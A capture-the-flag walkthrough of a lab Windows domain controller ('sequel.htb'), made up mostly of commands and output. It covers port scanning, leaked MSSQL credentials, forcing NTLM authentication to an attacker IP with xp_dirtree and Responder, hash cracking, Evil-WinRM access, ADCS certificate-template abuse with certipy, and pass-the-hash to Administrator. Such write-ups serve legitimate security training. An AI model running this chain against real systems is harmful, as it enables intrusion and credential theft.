## Full TCP Port Scan (Aggressive) [195s]

```bash
sudo nmap -Pn -p- -A -T4 10.129.228.253
```

```text
Starting Nmap 7.95 (https://nmap.org) at 2025-04-04 07:25 EDT
Nmap scan report for 10.129.228.253
Host is up (0.046s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49711/tcp open  msrpc         Microsoft Windows RPC
49721/tcp open  msrpc         Microsoft Windows RPC
49742/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Enumeration

### SMB Shares
List available shares:
```bash
smbclient -L \\\\10.129.228.253\\
```
```text
Sharename       Type      Comment
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share 
Public          Disk      
SYSVOL          Disk      Logon server share 
```

### Public Share Access
Download files from Public share:
```bash
smbclient //10.129.228.253/Public
```
```text
smb: \> get "SQL Server Procedures.pdf"
```

### PDF Analysis
Key findings from `SQL Server Procedures.pdf`:
- Access credentials: `PublicUser:GuestUserCantWrite1`
- Domain: `sequel.htb`

## Exploitation

### MSSQL Access
Connect using discovered credentials:
```bash
impacket-mssqlclient sequel/PublicUser:GuestUserCantWrite1@10.129.228.253
```

### NTLM Relay Attack
Capture NTLMv2 hash using Responder:
```bash
responder -I tun0
```
In MSSQL client:
```sql
EXEC xp_dirtree '\\10.10.16.27\HACK', 1, 1;
```

### Hash Cracking
Crack captured hash:
```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```
```text
SQL_SVC::sequel:d83afb1e567c4e35:796940ba3a26558c49e67e8d07734fbc...:REGGIE1234ronnie
```

### Initial Access via Evil-WinRM
```bash
evil-winrm -u SQL_SVC -p 'REGGIE1234ronnie' -i 10.129.228.253
```
```text
*Evil-WinRM* PS C:\Users\sql_svc\Documents>
```

### User Flag
```powershell
type C:\Users\Ryan.Cooper\Desktop\user.txt
0f56********************
```

## Privilege Escalation

### Credential Discovery
Found in SQL logs:
```text
2022-11-18 13:43:07.48 Logon failed for user 'NuclearMosquito3'
```

### Ryan.Cooper Access
```bash
evil-winrm -u Ryan.Cooper -p 'NuclearMosquito3' -i 10.129.228.253
```

### ADCS Enumeration
List certificate templates:
```bash
certipy-ad find -u 'Ryan.Cooper' -p 'NuclearMosquito3' -dc-ip 10.129.228.253
```

### Certificate Request
Request certificate for Administrator:
```bash
certipy-ad req -u 'Ryan.Cooper' -p 'NuclearMosquito3' -ca 'sequel-DC-CA' -template 'UserAuthentication' -upn Administrator -dc-ip 10.129.228.253
```
```text
[*] Saved certificate and private key to 'administrator.pfx'
```

### NT Hash Retrieval
```bash
certipy-ad auth -pfx administrator.pfx -domain sequel.htb -dc-ip 10.129.228.253
```
```text
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
```

### Administrator Access
Pass-the-hash with Evil-WinRM:
```bash
evil-winrm -u Administrator -H 'a52f78e4c751e5f5e17e1e9f3e58f4ee' -i 10.129.228.253
```

### Root Flag
```powershell
type C:\Users\Administrator\Desktop\root.txt
d2ced*************************
```
